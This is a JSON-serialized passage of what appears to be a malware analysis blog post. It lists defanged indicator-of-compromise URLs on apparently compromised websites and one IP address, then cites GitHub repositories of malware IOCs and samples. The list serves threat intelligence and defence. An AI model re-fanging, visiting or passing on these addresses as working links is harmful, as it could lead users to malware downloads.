                    "text": "https://yoho[.]love/wp-content/e4laFBDXIvYT6O/",
                    "html": "<p>https://yoho[.]love/wp-content/e4laFBDXIvYT6O/</p>"
                },
                {
                    "id": "<sentence_0xe74e0182>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://www.168801[.]xyz/wp-content/6J3CV4meLxvZP/",
                    "html": "<p>https://www.168801[.]xyz/wp-content/6J3CV4meLxvZP/</p>"
                },
                {
                    "id": "<sentence_0x1573cd11>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://www[.]pasionportufuturo[.]pe/wp-content/XUBS/",
                    "html": "<p>https://www[.]pasionportufuturo[.]pe/wp-content/XUBS/</p>"
                },
                {
                    "id": "<sentence_0x43ff3198>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://gamaes[.]shop/wp-content/plugins/sSTToaEwCG5VASw/",
                    "html": "<p>http://gamaes[.]shop/wp-content/plugins/sSTToaEwCG5VASw/</p>"
                },
                {
                    "id": "<sentence_0xddcc9c78>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://newsaarctech[.]com/wp-content/Sx9tvV5/",
                    "html": "<p>http://newsaarctech[.]com/wp-content/Sx9tvV5/</p>"
                },
                {
                    "id": "<sentence_0xa30d9b28>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://www[.]fizik[.]tv[.]tr/ex/mlFHNKb9x/",
                    "html": "<p>http://www[.]fizik[.]tv[.]tr/ex/mlFHNKb9x/</p>"
                },
                {
                    "id": "<sentence_0x102c7a00>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://shopallcars[.]com/node_modules/dXF0W/",
                    "html": "<p>https://shopallcars[.]com/node_modules/dXF0W/</p>"
                },
                {
                    "id": "<sentence_0x2f5daa7b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://infohybrid[.]com/assets/Lq5vllPN/",
                    "html": "<p>https://infohybrid[.]com/assets/Lq5vllPN/</p>"
                },
                {
                    "id": "<sentence_0x5a159ee0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://fse[.]in[.]ua/layouts/WMIxdId0bHiS/GnfihOVGqjmsWPJg4/",
                    "html": "<p>http://fse[.]in[.]ua/layouts/WMIxdId0bHiS/GnfihOVGqjmsWPJg4/</p>"
                },
                {
                    "id": "<sentence_0x6b0a65b4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://actividades[.]laforetlanguages[.]com/wpadmin/BlkdOKDXL/,",
                    "html": "<p>http://actividades[.]laforetlanguages[.]com/wpadmin/BlkdOKDXL/,</p>"
                },
                {
                    "id": "<sentence_0xe86692de>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://sbcopylive[.]com[.]br/rjuz/w/",
                    "html": "<p>http://sbcopylive[.]com[.]br/rjuz/w/</p>"
                },
                {
                    "id": "<sentence_0xfc269551>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://trasix[.]com/wpadmin/y5Aa1jt0Sp2Qk/",
                    "html": "<p>https://trasix[.]com/wpadmin/y5Aa1jt0Sp2Qk/</p>"
                },
                {
                    "id": "<sentence_0xa166aea1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://www.parkinsons[.]co.in/abc/Y6Y0fTbUEg6/",
                    "html": "<p>https://www.parkinsons[.]co.in/abc/Y6Y0fTbUEg6/</p>"
                },
                {
                    "id": "<sentence_0x1757fa32>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://biz[.]merlin[.]ua/wpadmin/W6agtFSRZGt371dV/",
                    "html": "<p>https://biz[.]merlin[.]ua/wpadmin/W6agtFSRZGt371dV/</p>"
                },
                {
                    "id": "<sentence_0xd968c00>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://bruckevn[.]site/3yztzzvh/nmY4wZfbYL/",
                    "html": "<p>http://bruckevn[.]site/3yztzzvh/nmY4wZfbYL/</p>"
                },
                {
                    "id": "<sentence_0xf7117744>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://pardiskood[.]com/wp-content/NR/",
                    "html": "<p>https://pardiskood[.]com/wp-content/NR/</p>"
                },
                {
                    "id": "<sentence_0x1e8c3d92>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://daujimaharajmandir[.]org/wp-includes/63De/",
                    "html": "<p>https://daujimaharajmandir[.]org/wp-includes/63De/</p>"
                },
                {
                    "id": "<sentence_0x863e6ceb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://datasits[.]com/wp-includes/Zkj4QO/",
                    "html": "<p>https://datasits[.]com/wp-includes/Zkj4QO/</p>"
                },
                {
                    "id": "<sentence_0x7fee6733>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://anugerahmasinternasional[.]co[.]id/wp-admin/SJbxE5I/",
                    "html": "<p>https://anugerahmasinternasional[.]co[.]id/wp-admin/SJbxE5I/</p>"
                },
                {
                    "id": "<sentence_0x3cd0f93>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://atmedic[.]cl/sistemas/3ZbsUAU/",
                    "html": "<p>https://atmedic[.]cl/sistemas/3ZbsUAU/</p>"
                },
                {
                    "id": "<sentence_0x39122>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://anwaralbasateen[.]com/Fox-C404/mDHkfgebMRzmGKBy/",
                    "html": "<p>https://anwaralbasateen[.]com/Fox-C404/mDHkfgebMRzmGKBy/</p>"
                },
                {
                    "id": "<sentence_0x3fac36f7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://dev[.]subs2me[.]com/wp-includes/EMa/",
                    "html": "<p>https://dev[.]subs2me[.]com/wp-includes/EMa/</p>"
                },
                {
                    "id": "<sentence_0xe4e8ab4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http:// 87[.]251[.]86[.]178/pp /PP.PNG",
                    "html": "<p>http:// 87[.]251[.]86[.]178/pp /PP.PNG</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x6851a768>",
            "title": "References",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xb7c3d16e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://github.com/executemalware/Malware-IOCs/",
                    "html": "<p>https://github.com/executemalware/Malware-IOCs/</p>"
                },
                {
                    "id": "<sentence_0xa40771f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://github.com/jstrosch/malware-samples",
                    "html": "<p>https://github.com/jstrosch/malware-samples</p>"
                },
                {
                    "id": "<sentence_0x6bf7a55d>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x9563ded5>",
            "title": "Like what you're reading? Subscribe to our top stories.",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x4a2d39f3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "If you want to subscribe to our monthly newsletter, please submit the form below.",
                    "html": "<p class=\"sendgrid_widget_text\">If you want to subscribe to our monthly newsletter, please submit the form below.</p>"
                },
                {
                    "id": "<sentence_0x916864e3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Email* :",
                    "html": " Email* : \n"
                },
                {
                    "id": "<sentence_0xccbcc0bb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbe4945ca>": "https://labs.k7computing.com/index.php/vajraspy-an-android-rat/"
                    },
                    "text": "Previous Post VajraSpy An Android RAT<crlf>Next Post",
                    "html": "<ul class=\"controls\">\n<li class=\"previous-post mouse-leaving\">\n<h3>Previous Post\u00ab <a href=\"https://labs.k7computing.com/index.php/vajraspy-an-android-rat/\" rel=\"prev\">VajraSpy \u2013 An Android RAT</a>\n</h3>\n</li>\n<li class=\"next-post mouse-leaving\">\n<h3>Next Post\n</h3>\n</li>\n</ul>"
                }
            ]
        }
    ]
}